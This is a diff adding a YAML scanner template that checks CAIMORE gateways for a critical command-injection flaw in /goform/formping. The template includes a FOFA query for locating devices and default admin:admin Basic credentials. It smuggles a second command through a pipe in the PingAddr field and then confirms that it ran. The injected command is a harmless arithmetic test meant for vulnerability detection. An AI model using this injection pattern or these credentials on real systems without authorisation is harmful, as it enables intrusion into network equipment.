@@ -1,0 +1,31 @@
+id: poc-yaml-caimore-formping-rce
+info:
+  name: 才茂通信网关 formping 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: ''
+  fofa: app="CAIMORE-Gateway"
+variables:
+  t1: random_int(111000,999000)
+  t2: random_int(10,100)
+  t3: t1 - t2
+requests:
+- method: POST
+  path: /goform/formping
+  headers:
+    Authorization: Basic YWRtaW46YWRtaW4=
+  data: PingAddr=127.0.0.1%7Cexpr+{{.t1}}+-+{{.t2}}&PingPackNumb=1&PingMsg=
+  expression: "status_code == 200 &&\ncontains(body,\"location.href=document.referrer\"\
+    ) \n"
+- method: GET
+  path: /pingmessages
+  headers:
+    Authorization: Basic YWRtaW46YWRtaW4=
+  expression: 'status_code == 200 &&
+
+    trim(body) == t3
+
+    '
+transport: http
